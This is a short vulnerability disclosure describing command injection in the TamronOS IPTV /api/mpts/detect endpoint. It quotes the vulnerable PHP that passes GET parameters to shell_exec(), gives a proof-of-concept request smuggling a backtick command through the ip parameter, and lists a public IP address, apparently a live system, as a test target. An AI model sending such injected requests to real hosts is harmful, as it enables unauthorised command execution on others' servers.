# Tamronos-iptv-detect-rce.md

The TamronOS IPTV system has command execution vulnerabilities

official website：http://www.tamronos.com/

## Vulnerability Details

The detect() method in the `iptv/Controllers/MptsController.php` file does not perform filtering verification on the `$_GET['address']` , `$_GET['ip']` passed in by the user. Instead, it is directly passed into function shell_exec() and can be used `` Truncating the command resulted in command injection.

![detect](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/detect.jpg)

Code:
```
    public function detect(){

        $file = '/tmp/mptsdetect.log';
        Command::rm($file);
        $cmd = sprintf('/usr/bin/sudo /usr/bin/dvblast -D %s/udp/ifaddr=%s >null 2>%s &', $_GET['address'], $_GET['ip'], $file);
        shell_exec($cmd);
....
```
Access the /api/mpts/detect path to call the detect() method


## Recurrence vulnerability

Test version : TamronOS IPTV 8.6.3 、  TamronOS IPTV/VOD系统 v5


request 
```
/api/mpts/detect?address=aaaa&ip=`touch+/cgi/public/js/aaa.txt`
```
![request_detect](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/request_detect.jpg)

http://localhost.com/js/aaa.txt

![testok](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/testok.jpg)


Test url
```
http://103.95.24.37/
```
